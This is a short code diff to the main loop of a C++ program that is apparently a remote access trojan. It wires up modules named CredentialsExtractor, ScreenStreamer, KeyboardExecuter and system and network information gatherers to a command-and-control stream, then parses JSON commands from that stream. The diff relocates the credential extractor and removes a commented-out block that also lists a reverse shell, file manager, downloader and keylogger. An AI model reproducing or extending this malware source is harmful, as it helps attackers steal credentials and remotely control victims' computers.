@@ -145,34 +145,13 @@ int main(int argc = 0, char *argv[] = nullptr) {
             Stream altStream = *get_connection("SCREEN_EVENT");
             ScreenStreamer screenStreamer(stream, altStream);
             stream = *get_connection("CREDENTIALS");
-            CredentialsExtractor credentialsExtractor(stream);
             stream = *get_connection("MAIN");
             MessageBoxGUI messageBoxGUI(stream);
+            CredentialsExtractor credentialsExtractor(stream);
             KeyboardExecuter keyboardExecuter(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
-
-
-
             bool streamListening = true;
-            /*
-            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
-                std::cout << "Connected to server!" << std::endl;
-                Stream stream(sock);
-                SystemInformation sysInfo(stream);
-                NetworkInformation networkInfo(stream);
-                FileManager fileManager(stream);
-                ReverseShell reverseShell(stream);
-                Download download(stream);
-                KeyboardExecuter keyboardExecuter(stream);
-                Permission permission(stream);
-                MessageBoxGUI messageBoxGui(stream);
-#ifdef KEYLOGGER_DEF
-                keyLogger.setStream(stream);
-#endif
-             */
-
-
             while (streamListening) {
                 jsonObject = nlohmann::json::parse(stream.readString());
                 int action = jsonObject["action"];
